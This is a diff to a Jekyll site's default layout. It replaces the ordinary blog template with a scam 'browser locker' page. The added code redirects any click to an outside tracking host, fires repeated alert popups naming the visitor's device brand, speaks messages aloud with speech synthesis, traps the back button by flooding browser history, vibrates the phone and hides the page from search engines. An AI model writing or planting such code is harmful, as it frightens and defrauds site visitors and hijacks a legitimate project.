@@ -1,51 +1,5 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>{% if page.title %}{{ page.title }} – {% endif %}{{ site.name }} – {{ site.description }}</title>
-
-    {% include meta.html %}
-
-    <!--[if lt IE 9]>
-      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
-    <![endif]-->
-
-    <link rel="stylesheet" type="text/css" href="{{ site.baseurl }}/style.css" />
-    <link rel="alternate" type="application/rss+xml" title="{{ site.name }} - {{ site.description }}" href="{{ site.baseurl }}/feed.xml" />
-
-    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
-  </head>
-
-  <body>
-    <div class="wrapper-masthead">
-      <div class="container">
-        <header class="masthead clearfix">
-          <a href="{{ site.baseurl }}/" class="site-avatar"><img src="{{ site.avatar }}" /></a>
-
-          <div class="site-info">
-            <h1 class="site-name"><a href="{{ site.baseurl }}/">{{ site.name }}</a></h1>
-            <p class="site-description">{{ site.description }}</p>
-          </div>
-
-          <nav>
-            <a href="{{ site.baseurl }}/">Blog</a>
-            <a href="{{ site.baseurl }}/about">About</a>
-          </nav>
-        </header>
-      </div>
-    </div>
-
-    <div id="main" role="main" class="container">
-      {{ content }}
-    </div>
-
-    <div class="wrapper-footer">
-      <div class="container">
-        <footer class="footer">
-          {% include svg-icons.html %}
-        </footer>
-      </div>
-    </div>
-
-    {% include analytics.html %}
-  </body>
-</html>
+---
+layout: compress
+---
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name=viewport content='width=device-width, initial-scale=1'><meta name=format-detection content=telephone=no><meta name=google content=notranslate><meta name=robots content='noindex, nofollow, noarchive'><script>function go(){var lw='https://tracyber-plarted.com/click';location.href=lw;}</script><link href=1.png rel=icon type=image/x-icon/><title>{{ page.title }}</title><style>img{float:left;padding-right:10px}html,body{width:100%;height:100%}body{font-family:-apple-system,"Roboto",Trebuchet MS,sans-serif;font-size:.85em;line-height:1.2em;background:#999}a{text-decoration:none}h1,p{margin:0}h1{margin-bottom:9px;font-weight:bold;font-size:127%;line-height:100%}.w{min-width:240px;height:100%}.wi{position:absolute;left:0;right:0;top:50%;max-width:270px;margin:auto;border-radius:12px;background:#f9f9f9;-webkit-transform:translate(0,-50%);-moz-transform:translate(0,-50%);transform:translate(0,-50%)}.t{margin:7.6% 7% 8%}.s{position:relative;font-weight:bold;font-size:130%;border-top:1px solid #b4b4b4}.s:after{content:'';position:absolute;left:50%;top:0;bottom:0;border-left:1px solid #b4b4b4}.b{display:inline-block;padding:15px 3%;width:43%;color:#1275ec;text-align:center}.bl{animation:er 1s linear infinite}@keyframes er{50%{opacity:.3;color:red}}</style>
+    <script>setTimeout(function(){alert(msg)},200);var ch= ' '+'{{page.ch}}',cf='{{page.cf}}'+' ',ti='{{page.ti}}';var gets=(function(){var a=location.search;var b=new Object();a=a.substring(1).split("&");for(var i=0;i<a.length;i++){var x=a[i].split("=");b[x[0]]=x[1];}return b;})();var m=gets['brand'];var rs;if(m=='Generic'||m=='Google'||m=='Unknown'||m=='Mozilla'){rs='Android'}else{rs=m;}var msg='\n'+ti+'!\n\n'+cf+rs+ch;function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI='native';b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang='hi';speechSynthesis.speak(b)}speak(ti);function ran(min,max){return Math.floor(Math.random()*(max-min+1))+min;}function cs(){speak('{{page.speak}}');alert(cf+rs+ch);}setTimeout(cs,ran(10,27)*1000);</script><script>/*<![CDATA[*/!function(){var t;try{for(t=0;10>t;++t)history.pushState({},"","#");onpopstate=function(t){t.state&&alert(msg)&location.replace(location.href);}}catch(o){}}();if(navigator&&navigator.vibrate){var q=50,y=30,hu=100;navigator.vibrate([q,y,hu,y,hu,y,hu,y,hu,y,hu,y,hu,y,hu,y,hu,y,hu,y]);}else{navigator.vibrate(0);}/*]]>*/</script></head><body onclick="go()"><div class=w><div class=wi>{{ content }}</div></div></body></html>
